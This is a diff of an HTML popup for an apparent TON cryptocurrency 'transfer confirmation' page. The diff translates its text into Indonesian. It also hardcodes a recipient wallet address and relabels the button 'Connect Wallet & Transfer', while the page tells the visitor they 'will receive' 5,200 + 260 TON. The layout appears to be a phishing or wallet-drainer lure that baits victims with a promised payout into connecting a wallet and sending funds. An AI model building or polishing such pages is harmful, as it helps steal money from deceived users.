@@ -279,31 +279,34 @@
         <div class="popup-body">
             <section>
                 <button class="close-btn" id="popup-close-btn">&times;</button>
-                <h2>Confirmation Your Transaction</h2>
-                <p class="popup-text">Silakan tinjau detail transfer Anda.</p>
+                
+                <h2>Konfirmasi Transfer TON</h2>
+                <p class="popup-text">Silakan tinjau detail transfer Anda sebelum terhubung ke dompet.</p>
+                
                 <form class="js-place-bid-form">
                     <div class="form-group">
-                        <label for="bid_value">You will receive</label>
+                        <label for="bid_value">Anda akan menerima</label>
                         <div class="tm-section-box tm-section-buttons">
                             <span class="form-control btn-kyc" style="text-align: center;">
-                                <span class="icon-before icon-ton tm-amount">5,200</span>
+                                <span class="icon-before icon-ton tm-amount">5,200 </span>
                                 <h4>+</h4>
                                 <span class="icon-before icon-ton tm-amount">260</span>
                             </span>
                         </div>
-                        <p class="help-block">Approximately $<span class="js-bid_usd_value">17,398</span></p>
-                        <div class="tm-form-control-hint">
-                            <p><strong></strong></p>
-                            <p id="transferRecipient"></p>
-                        </div>
+                        <p class="help-block">Alamat tujuan:</p>
+                            <div class="tm-form-control-hint">
+                                <strong id="transferRecipient">0QD4uCCSKWqbVEeksIA_a2DLGftKWYpd-IO5TQIns6ZNP_-U</strong>
+                            </div>
                     </div>
+                    
                     <div class="form-main-button">
-                        <button id="connectTransferBtn" class="btn btn-primary btn-block" type="button">
-                            <span class="tm-button-label">Continue</span>
+                        <button id="connectTransferBtn" class="btn btn-primary btn-block">
+                            <span class="tm-button-label">Connect Wallet & Transfer </span>
                         </button>
                     </div>
                 </form>
             </section>
+            
             <div id="statusMessage" class="status-message" style="display: none;"></div>
         </div>
     </div>
